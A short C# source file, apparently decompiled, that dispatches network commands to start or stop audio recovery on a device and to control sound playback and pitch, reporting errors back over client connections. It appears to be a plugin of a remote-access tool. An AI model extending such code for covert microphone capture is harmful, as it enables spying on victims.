using System;
using Leb128;
using Plugin.Handler;
using Plugin.Helper;

namespace Plugin;

internal class Packet
{
	public static void Read(byte[] data)
	{
		try
		{
			object[] array = LEB128.Read(data);
			switch ((string)array[0])
			{
			case "RecoveryNAudio":
				HandlerSoundRecover.Recover((byte)array[1]);
				break;
			case "RecoveryStopNAudio":
				HandlerSoundRecover.Stop();
				break;
			case "PlayerStart":
				HandlerSoundPlayer.tone = (float)array[1];
				HandlerSoundPlayer.Start();
				break;
			case "PlayerStop":
				HandlerSoundPlayer.Stop();
				break;
			case "PlayerBuffer":
				HandlerSoundPlayer.Buffer((byte[])array[1]);
				break;
			case "Tone":
				HandlerSoundPlayer.SMB.PitchFactor = (float)array[1];
				break;
			}
		}
		catch (Exception ex)
		{
			if (Client1.itsConnect)
			{
				Client1.Error(ex.ToString());
			}
			else if (Client2.itsConnect)
			{
				Client2.Error(ex.ToString());
			}
		}
	}
}
